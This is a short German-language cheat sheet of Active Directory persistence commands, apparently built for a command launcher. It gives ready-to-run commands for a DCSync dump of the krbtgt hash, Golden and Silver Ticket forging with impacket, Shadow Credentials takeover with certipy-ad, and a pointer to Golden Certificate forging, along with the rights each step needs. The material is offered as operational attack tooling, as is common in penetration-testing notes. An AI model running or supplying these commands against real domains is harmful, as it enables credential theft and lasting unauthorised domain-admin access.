# KAT

#plateform/linux #target/remote #cat/PERSIST

% boris, persistence, persist, dcsync, secretsdump, impacket, krbtgt, justdcuser, drsuapi
## [PERS-a] DCSync - gezielt krbtgt-Hash ziehen (fuer Golden Ticket)
Braucht DCSync-Rechte (DA / GetChanges). -just-dc-user auch fuer beliebigen User.
```
impacket-secretsdump -just-dc-user 'krbtgt' '<domain>/<user>:<password>@<dc_fqdn>'
```

% boris, persistence, persist, goldenticket, ticketer, impacket, krbtgt, forge, tgt
## [PERS-b] Golden Ticket - impacket-ticketer (braucht krbtgt-Hash + domain-SID)
domain_sid = Domain-SID ohne RID. Ergebnis: administrator.ccache -> export KRB5CCNAME + -k nutzen (siehe lateral).
```
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> administrator
```

% boris, persistence, persist, silverticket, ticketer, impacket, servicehash, spn
## [PERS-c] Silver Ticket - gezielt auf einen Dienst (Service-/Machine-Hash)
service_hash = NT-Hash des Computer-/Dienstkontos. -spn z.B. cifs/<target_fqdn>.
```
impacket-ticketer -nthash <service_hash> -domain-sid <domain_sid> -domain <domain> -spn cifs/<target_fqdn> administrator
```

% boris, persistence, persist, shadowcredentials, certipy, keycredentiallink, msds, takeover
## [PERS-d] Shadow Credentials - certipy-ad shadow auto (braucht GenericWrite aufs Ziel)
Setzt msDS-KeyCredentialLink -> liefert NT-Hash + TGT des Ziel-Kontos. target_sam = Ziel (User/Computer$).
```
certipy-ad shadow auto -account <target_sam> -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>
```

% boris, persistence, persist, goldencert, certipy, ca, forge, crossref, adcs
## [PERS-e] Golden Certificate - Cross-Ref adcs (CA-Key -> beliebige Certs offline forgen)
Kein neuer Befehl: siehe adcs ADCS-GC-a (ca -backup) + ADCS-GC-b (forge). Dauerhafte DA-Persistence bis CA-Renewal.
```
echo 'siehe: certipy-ad ca -backup ... && certipy-ad forge ...  (Datei 11_path_adcs / tippe: adcs goldencert)'
```
